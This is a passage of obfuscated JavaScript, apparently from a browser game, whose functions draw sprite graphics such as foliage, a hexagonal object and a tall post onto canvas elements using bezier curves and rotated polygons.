			Δ.bezierCurveTo(ᐃ * 332, ᐃ * 194, ᐃ * 347, ᐃ * 192, 372 * ᐃ, 188 * ᐃ);
			Δ.bezierCurveTo(366 * ᐃ, ᐃ * 174.5, ᐃ * 366, 174.5 * ᐃ, 360 * ᐃ, 161 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 253.5, ᐃ * 162, ᐃ * 253.5, 162 * ᐃ, ᐃ * 147, 163 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ᐃΔᐃⲆ;
			Δ.translate(0, ᐃ * -6);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 100, ᐃ * 116);
			Δ.bezierCurveTo(90 * ᐃ, 101 * ᐃ, 96 * ᐃ, 89 * ᐃ, 106 * ᐃ, 83 * ᐃ);
			Δ.bezierCurveTo(86 * ᐃ, 79 * ᐃ, ᐃ * 86, ᐃ * 52, 93 * ᐃ, ᐃ * 38);
			Δ.bezierCurveTo(99 * ᐃ, ᐃ * 51, ᐃ * 107, ᐃ * 57, ᐃ * 122, 63 * ᐃ);
			Δ.bezierCurveTo(130 * ᐃ, ᐃ * 53, ᐃ * 141, 46 * ᐃ, ᐃ * 161, ᐃ * 46);
			Δ.bezierCurveTo(157 * ᐃ, ᐃ * 31, 158 * ᐃ, ᐃ * ⵠΔΔⲆᐃ, ᐃ * 169, 6 * ᐃ);
			Δ.bezierCurveTo(171 * ᐃ, 24 * ᐃ, 186 * ᐃ, ᐃ * 33, 198 * ᐃ, ᐃ * 45);
			Δ.bezierCurveTo(252 * ᐃ, 45 * ᐃ, ᐃ * 252, 45 * ᐃ, ᐃ * 306, 45 * ᐃ);
			Δ.bezierCurveTo(323 * ᐃ, ᐃ * 33, ᐃ * 332, ᐃ * 21, ᐃ * 335, 7 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 349, ᐃ * 21, ᐃ * 347, 36 * ᐃ, 345 * ᐃ, ᐃ * 46);
			Δ.bezierCurveTo(364 * ᐃ, ᐃ * 46, ᐃ * 369, ᐃ * 48, 377 * ᐃ, ᐃ * 63);
			Δ.bezierCurveTo(ᐃ * 398, ᐃ * 58, 403 * ᐃ, 49 * ᐃ, ᐃ * 409, 40 * ᐃ);
			Δ.bezierCurveTo(419 * ᐃ, 57 * ᐃ, ᐃ * 411, ᐃ * 79, 398 * ᐃ, ᐃ * 85);
			Δ.bezierCurveTo(405 * ᐃ, ᐃ * 100, 405 * ᐃ, ᐃ * 106, 401 * ᐃ, 118 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 332.5, 128.5 * ᐃ, ᐃ * 332.5, ᐃ * 128.5, ᐃ * 264, ᐃ * 139);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆᐃᐃ], Ⲇᐃ[2], ᐃ * ᐃΔⲆᐃⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(122 * ᐃ, 191 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 123, ᐃ * 237, ᐃ * 135, 245 * ᐃ, 153 * ᐃ, ᐃ * 259);
			Δ.bezierCurveTo(ᐃ * 167, ᐃ * 269, ᐃ * 158, 281 * ᐃ, 118 * ᐃ, ᐃ * 276);
			Δ.bezierCurveTo(104 * ᐃ, 273 * ᐃ, 98 * ᐃ, ᐃ * 268, ᐃ * 93, ᐃ * 242);
			Δ.bezierCurveTo(ᐃ * 89, 220 * ᐃ, 92 * ᐃ, 201 * ᐃ, ᐃ * 102, ᐃ * 179);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[2], ᐃ * ⲆⵠⲆⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(403 * ᐃ, ᐃ * 182);
			Δ.bezierCurveTo(414 * ᐃ, 215 * ᐃ, ᐃ * 412, ᐃ * 232, 403 * ᐃ, 260 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 395, ᐃ * 274, 375 * ᐃ, ᐃ * 272, 356 * ᐃ, 270 * ᐃ);
			Δ.bezierCurveTo(345 * ᐃ, 268 * ᐃ, ᐃ * 339, 262 * ᐃ, 354 * ᐃ, 252 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 370, 242 * ᐃ, ᐃ * 380, ᐃ * 225, ᐃ * 384, ᐃ * 184);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[2], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠΔ];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 155, 157 * ᐃ);
			Δ.bezierCurveTo(146 * ᐃ, 189 * ᐃ, 137 * ᐃ, ᐃ * 198, ᐃ * 114, 219 * ᐃ);
			Δ.bezierCurveTo(104 * ᐃ, ᐃ * 212, ᐃ * 98, 203 * ᐃ, ᐃ * 89, 189 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 82, 178 * ᐃ, ᐃ * 91, 164 * ᐃ, 93 * ᐃ, ᐃ * 136);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠᐃ], Ⲇᐃ[2], 10 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(ᐃ * 347, ᐃ * 162);
			Δ.bezierCurveTo(ᐃ * 357, 195 * ᐃ, 376 * ᐃ, 209 * ᐃ, 387 * ᐃ, 217 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 409, 201 * ᐃ, ᐃ * 420, 181 * ᐃ, 416 * ᐃ, 166 * ᐃ);
			Δ.bezierCurveTo(410 * ᐃ, 150 * ᐃ, 412 * ᐃ, ᐃ * 149, 408 * ᐃ, ᐃ * 130);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ᐃⲆⵠᐃ], ΔⲆⵠⲆⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃᐃⲆᐃ];
			Δ.moveTo(86 * ᐃ, ᐃ * 134);
			Δ.bezierCurveTo(79 * ᐃ, 102 * ᐃ, 92 * ᐃ, 84 * ᐃ, ᐃ * 108, ᐃ * 92);
			Δ.bezierCurveTo(ᐃ * 149, ᐃ * 108, ᐃ * 184, ᐃ * 111, 242 * ᐃ, 111 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 294, ᐃ * 108, 341 * ᐃ, ᐃ * 105, ᐃ * 386, ᐃ * 98);
			Δ.bezierCurveTo(ᐃ * 412, ᐃ * 91, 417 * ᐃ, ᐃ * 86, ᐃ * 415, ᐃ * 133);
			Δ.bezierCurveTo(ᐃ * 413, ᐃ * 160, ᐃ * 413, 160 * ᐃ, ᐃ * 368, 174 * ᐃ);
			Δ.bezierCurveTo(308 * ᐃ, 184 * ᐃ, ᐃ * 291, ᐃ * 185, ᐃ * 270, 186 * ᐃ);
			Δ.bezierCurveTo(264 * ᐃ, ᐃ * 206, ᐃ * 262, ᐃ * 215, ᐃ * 253, ᐃ * 215);
			Δ.bezierCurveTo(239 * ᐃ, ᐃ * 217, 239 * ᐃ, ᐃ * 211, ᐃ * 231, 186 * ᐃ);
			Δ.bezierCurveTo(178 * ᐃ, ᐃ * 184, ᐃ * 156, 179 * ᐃ, ᐃ * 112, ᐃ * 162);
			Δ.bezierCurveTo(87 * ᐃ, 151 * ᐃ, ᐃ * 90, 144 * ᐃ, ᐃ * 87, ᐃ * 137);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠΔᐃΔ], Ⲇᐃ[ⵠⵠⵠΔ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔΔᐃ];
			Δ.moveTo(ᐃ * 63, ᐃ * 98);
			Δ.bezierCurveTo(84 * ᐃ, 121 * ᐃ, ᐃ * 109, 102 * ᐃ, 124 * ᐃ, 117 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 138, ᐃ * 136, ᐃ * 123, 165 * ᐃ, ᐃ * 94, ᐃ * 150);
			Δ.bezierCurveTo(ᐃ * 66, ᐃ * 131, 64 * ᐃ, ᐃ * 115, 63 * ᐃ, 99 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ], Ⲇᐃ[ⵠⵠΔⲆ], ᐃ * 10);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 449, ᐃ * 97);
			Δ.bezierCurveTo(446 * ᐃ, 143 * ᐃ, 415 * ᐃ, ᐃ * 151, ᐃ * 402, 155 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 386, 157 * ᐃ, 373 * ᐃ, ᐃ * 133, ᐃ * 391, ᐃ * 116);
			Δ.bezierCurveTo(402 * ᐃ, 106 * ᐃ, ᐃ * 432, 124 * ᐃ, ᐃ * 449, 97 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆΔᐃ], Ⲇᐃ[2], ᐃ * ΔⲆⵠⲆⲆ);
			return Ⲇⵠ
		}

		function ᐃⵠᐃΔᐃⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 125;
			Ⲇⵠ.height = ᐃ * 139;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⵠΔᐃ;
			Δ.save();
			Δ.translate(63 * ᐃ, 79 * ᐃ);
			Δ.rotate(1);
			ⵠΔⵠᐃ(Δ, 8, 60 * ᐃ, ᐃ * 10);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.restore();
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 63, 69 * ᐃ);
			Δ.rotate(ΔΔΔ);
			ⵠΔⵠᐃ(Δ, 8, ᐃ * 60, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], ᐃⵠⵠΔ);
			Δ.rotate(.56);
			ⵠΔⵠᐃ(Δ, ΔⲆᐃⵠⲆΔⵠ, 40 * ᐃ, ᐃ * 10);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ], Ⲇᐃ[4], ⵠⵠΔᐃΔ);
			Δ.rotate(.28);
			ⵠΔⵠᐃ(Δ, 8, 28 * ᐃ, 8 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔᐃⲆ]);
			Δ.restore();
			return Ⲇⵠ
		}

		function ᐃⵠⲆᐃᐃᐃⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 130;
			Ⲇⵠ.height = 142 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ⲆⵠⲆⲆ;
			Δ.save();
			Δ.translate(65 * ᐃ, 80 * ᐃ);
			Δ.rotate(.2);
			ⵠΔⵠᐃ(Δ, ΔΔⵠⲆⵠ, 60 * ᐃ, ᐃ * 10);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(ᐃ * 65, ᐃ * 71);
			Δ.rotate(.2);
			ⵠΔⵠᐃ(Δ, ᐃⵠⲆΔⲆᐃⲆ, ᐃ * 60, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⵠⵠΔⲆ], ⲆⵠᐃⲆ);
			Δ.rotate(-.32);
			ⵠΔⵠᐃ(Δ, 9, ᐃ * 38, 10 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆΔⲆ], Ⲇᐃ[4], ⲆⲆⲆΔ);
			Δ.rotate(.68);
			ⵠΔⵠᐃ(Δ, ⲆΔⵠᐃΔ, ᐃ * 20, ᐃ * 8);
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[ⲆᐃⲆΔΔ], ΔᐃⲆᐃ);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⲆΔΔΔⲆⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 300;
			Ⲇⵠ.height = 300 * ᐃ;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.save();
			Δ.translate(ᐃ * 150, ᐃ * 160);
			Δ.rotate(6.28);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 146, 30 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.save();
			Δ.translate(150 * ᐃ, 150 * ᐃ);
			Δ.rotate(6.28);
			ⵠΔⵠᐃ(Δ, ⵠⵠⵠⲆⲆ, 146 * ᐃ, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆᐃᐃⲆ], ⲆⲆᐃⵠΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 150, ᐃ * 150);
			Δ.rotate(ΔⲆⵠⲆ);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 105, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⵠⵠⵠ], Ⲇᐃ[ΔⲆΔᐃ], 8 * ᐃ);
			Δ.save();
			Δ.translate(150 * ᐃ, ᐃ * 150);
			Δ.rotate(0);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 66, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[ⲆⵠΔΔ], ⵠⲆⲆΔΔ * ᐃ);
			Δ.save();
			Δ.translate(ᐃ * 150, 150 * ᐃ);
			Δ.rotate(Ⲇᐃⵠⵠ);
			ⵠΔⵠᐃ(Δ, 6, ᐃ * 31, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], ᐃ * ⵠⵠᐃΔⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃᐃⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 150, 207 * ᐃ);
			Δ.bezierCurveTo(150 * ᐃ, 151 * ᐃ, 150 * ᐃ, ᐃ * 101, ᐃ * 150, 94 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[Ⲇᐃᐃⵠ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠⵠΔΔ];
			Δ.moveTo(ᐃ * 118, 100 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 118, 205 * ᐃ, ᐃ * 118, 207 * ᐃ, ᐃ * 118, 200 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⵠΔᐃⲆΔ, Ⲇᐃ[ⵠⵠⵠΔ], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			Δ.moveTo(183 * ᐃ, ΔᐃΔᐃΔ * ᐃ);
			Δ.bezierCurveTo(183 * ᐃ, 203 * ᐃ, 183 * ᐃ, 203 * ᐃ, ᐃ * 183, 200 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, ⲆᐃΔⲆᐃ, Ⲇᐃ[2], ᐃⵠⲆᐃᐃ * ᐃ);
			return Ⲇⵠ
		}

		function ΔᐃⲆⲆᐃⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 90;
			Ⲇⵠ.height = ᐃ * 98;
			Δ.translate(0, 4 * ᐃ);
			if (Δⵠᐃ === ⵠᐃ) {
				Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃⲆᐃ;
				Δ.save();
				Δ.translate(ᐃ * 44, ᐃ * 50);
				Δ.rotate(.2);
				ⵠΔⵠᐃ(Δ, ΔΔΔᐃᐃ, 41 * ᐃ, 10 * ᐃ);
				Δ.restore();
				ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ])
			}
			Δ.globalAlpha = ⵠΔΔ;
			Δ.save();
			Δ.translate(44 * ᐃ, ᐃ * 44);
			Δ.rotate(.2);
			ⵠΔⵠᐃ(Δ, 9, ᐃ * 41, ᐃ * ⲆⵠΔΔᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[Ⲇⵠⵠᐃ], ᐃ * 4);
			Δ.rotate(-.32);
			ⵠΔⵠᐃ(Δ, ΔΔΔΔΔ, 32 * ᐃ, ᐃ * ⲆⲆᐃΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆⲆ], Ⲇᐃ[4], ᐃ * 4);
			Δ.rotate(.68);
			ⵠΔⵠᐃ(Δ, 9, ᐃ * 23, ᐃⵠⵠⵠⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5], Ⲇᐃ[6], 6 * ᐃ);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃ * 45, 45 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, -ⲆΔⲆΔⵠ * ᐃ, -25.5 * ᐃ, ᐃⵠⲆΔΔ * ᐃ, 51 * ᐃ, ᐃ * 30);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[4], Ⲇᐃ[Ⲇⵠⵠⵠ], ᐃ * 2);
			Δ.save();
			Δ.translate(45 * ᐃ, 45 * ᐃ);
			Δ.rotate(0);
			Ⲇᐃᐃ(Δ, ᐃ * -26, ᐃ * -ΔΔΔᐃᐃ, 52 * ᐃ, ᐃ * 18, 30 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆⲆ], Ⲇᐃ[ⵠⵠΔᐃΔ], Ⲇⵠⵠᐃ * ᐃ);
			ⵠᐃᐃ(Δ, 45 * ᐃ, ᐃ * 29, ᐃ * 7);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, 45 * ᐃ, 61 * ᐃ, ᐃ * ᐃΔⲆΔᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⲆΔ]);
			ⵠᐃᐃ(Δ, ᐃ * 28, 45 * ᐃ, ⲆᐃᐃᐃΔ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			ⵠᐃᐃ(Δ, 62 * ᐃ, 45 * ᐃ, ᐃ * ᐃⵠⵠⵠΔ);
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}

		function ⲆⲆᐃⵠⲆᐃⲆ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 130 * ᐃ;
			Ⲇⵠ.height = ᐃ * 148;
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ᐃΔᐃⲆ;
			Δ.save();
			Δ.translate(65 * ᐃ, 85 * ᐃ);
			Δ.rotate(1.4);
			ⵠΔⵠᐃ(Δ, 7, 60 * ᐃ, 10 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ᐃᐃⵠ;
			Δ.save();
			Δ.translate(ᐃ * 65, 74 * ᐃ);
			Δ.rotate(1.4);
			ⵠΔⵠᐃ(Δ, ⲆⲆⵠⲆⵠ, 60 * ᐃ, ⲆΔΔᐃᐃ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ], Ⲇᐃ[2], ⲆⲆⲆΔ);
			Δ.rotate(.64);
			ⵠΔⵠᐃ(Δ, 7, ᐃ * 40, ᐃΔᐃΔⲆ * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], ⲆΔⵠᐃ);
			Δ.rotate(.12);
			ⵠΔⵠᐃ(Δ, ᐃⵠᐃⵠⵠΔᐃ, ᐃ * 23, ᐃᐃⲆᐃ * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[5]);
			return Ⲇⵠ
		}

		function ΔⲆⵠΔΔᐃΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 115 * ᐃ;
			Ⲇⵠ.height = ᐃ * 585;
			Δ.scale(-1, 1);
			Δ.translate(ᐃ * -110, 0);
			Δ.translate(10 * ᐃ, ᐃ * 10);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.save();
			Δ.translate(ᐃ * 51.5, ᐃ * 342);
			Ⲇᐃᐃ(Δ, -14.5 * ᐃ, -225 * ᐃ, 29 * ᐃ, 450 * ᐃ, 20 * ᐃ);
			Δ.restore();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃΔⵠ];
			Δ.moveTo(54 * ᐃ, 83 * ᐃ);
			Δ.bezierCurveTo(70 * ᐃ, 69 * ᐃ, ᐃ * 78, ᐃ * 62, 82 * ᐃ, ᐃ * 40);
			Δ.bezierCurveTo(93 * ᐃ, ᐃ * 48, 103 * ᐃ, ᐃ * 64, ᐃ * 95, ᐃ * 102);
			Δ.bezierCurveTo(ᐃ * 60, 114 * ᐃ, ᐃ * 53, 103 * ᐃ, 54 * ᐃ, ᐃ * 85);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔΔᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 95, 97 * ᐃ);
			Δ.bezierCurveTo(56 * ᐃ, 102 * ᐃ, ᐃ * 43, ᐃ * 77, 71 * ᐃ, ᐃ * 6);
			Δ.bezierCurveTo(ᐃ * 34, ᐃ * 10, ᐃ * 6, ᐃ * 43, ⵠⲆⵠⵠ * ᐃ, 76 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 4, 98 * ᐃ, 15 * ᐃ, 130 * ᐃ, 64 * ᐃ, 130 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 76, 129 * ᐃ, ᐃ * 95, ᐃ * 113, ᐃ * 97, 97 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(55 * ᐃ, 176 * ᐃ);
			Δ.bezierCurveTo(74 * ᐃ, ᐃ * 175, 82 * ᐃ, 169 * ᐃ, ᐃ * 96, ᐃ * 155);
			Δ.bezierCurveTo(ᐃ * 103, ᐃ * 183, ᐃ * 95, 214 * ᐃ, ᐃ * 54, ᐃ * 219);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠΔ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(50 * ᐃ, ᐃ * 176);
			Δ.bezierCurveTo(25 * ᐃ, ᐃ * 177, ΔΔᐃᐃΔ * ᐃ, 164 * ᐃ, ᐃ * 7, ᐃ * 156);
			Δ.bezierCurveTo(ᐃ * ᐃⵠⲆ, 186 * ᐃ, 10 * ᐃ, ᐃ * 201, 43 * ᐃ, ᐃ * 220);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 35, ᐃ * 403);
			Δ.bezierCurveTo(ᐃ * 47, ᐃ * 412, ᐃ * 58, 412 * ᐃ, ᐃ * 67, ᐃ * 403);
			Δ.bezierCurveTo(ᐃ * 66.5, ᐃ * 434, ᐃ * 66.5, 434 * ᐃ, ᐃ * 66, 465 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 56, ᐃ * 480, 40 * ᐃ, 472 * ᐃ, ᐃ * 36, 465 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 59, ᐃ * 67);
			Δ.bezierCurveTo(47 * ᐃ, 97 * ᐃ, ᐃ * ᐃᐃΔⲆⲆΔⲆ, 117 * ᐃ, 11 * ᐃ, ᐃ * 110);
			Δ.bezierCurveTo(ᐃ * ⵠΔⲆⵠⲆⵠΔ, 115 * ᐃ, ⲆᐃⲆΔⲆ * ᐃ, ᐃ * 122, 23 * ᐃ, 124 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 46, 118 * ᐃ, ᐃ * 52, 113 * ᐃ, 62 * ᐃ, ᐃ * 86);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Δⵠᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(30 * ᐃ, ᐃ * 125);
			Δ.bezierCurveTo(47 * ᐃ, 136 * ᐃ, ᐃ * 57, 134 * ᐃ, 77 * ᐃ, 127 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 71, 158 * ᐃ, 71 * ᐃ, ᐃ * 159, ᐃ * 66, 159 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 50.5, 156.5 * ᐃ, ᐃ * 50.5, 156.5 * ᐃ, ᐃ * 35, ᐃ * 154);
			Δ.bezierCurveTo(31 * ᐃ, ᐃ * 145, ᐃ * 31, 136 * ᐃ, ᐃ * 31, ᐃ * 125);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔΔⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔⲆ];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(35 * ᐃ, ᐃ * 171);
			Δ.bezierCurveTo(32 * ᐃ, ᐃ * 221, ᐃ * 43, 233 * ᐃ, 70 * ᐃ, ᐃ * 247);
			Δ.bezierCurveTo(75 * ᐃ, 234 * ᐃ, 75 * ᐃ, ᐃ * 230, 72 * ᐃ, ᐃ * 221);
			Δ.bezierCurveTo(48 * ᐃ, ᐃ * 206, ᐃ * 54, 188 * ᐃ, 50 * ᐃ, 176 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃⲆⵠⵠ];
			Δ.lineJoin = ⵠ[ⵠⲆᐃᐃ];
			Δ.moveTo(60 * ᐃ, 68 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 63, 69 * ᐃ, 65 * ᐃ, ᐃ * 71, 67 * ᐃ, 77 * ᐃ);
			Δ.bezierCurveTo(61 * ᐃ, ᐃ * 123, ᐃ * 52, ᐃ * 137, ᐃ * 42, 150 * ᐃ);
			Δ.bezierCurveTo(38 * ᐃ, ᐃ * 151, ᐃ * 38, 151 * ᐃ, ᐃ * 34, 152 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33, 146.5 * ᐃ, 33 * ᐃ, ᐃ * 146.5, ᐃ * 32, ᐃ * 141);
			Δ.bezierCurveTo(ᐃ * 49, 118 * ᐃ, 63 * ᐃ, ᐃ * 87, ᐃ * 59, 68 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃᐃᐃ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆⲆΔⵠ];
			Δ.lineJoin = ⵠ[ⵠⵠᐃⵠ];
			Δ.moveTo(ᐃ * 71, ᐃ * 172);
			Δ.bezierCurveTo(56 * ᐃ, ᐃ * 222, 49 * ᐃ, 234 * ᐃ, ᐃ * 35, ᐃ * 248);
			Δ.bezierCurveTo(30 * ᐃ, ᐃ * 236, 30 * ᐃ, ᐃ * 230, 31 * ᐃ, ᐃ * 217);
			Δ.bezierCurveTo(ᐃ * 44, 202 * ᐃ, 49 * ᐃ, ᐃ * 191, ᐃ * 52, ᐃ * 172);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔⲆⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
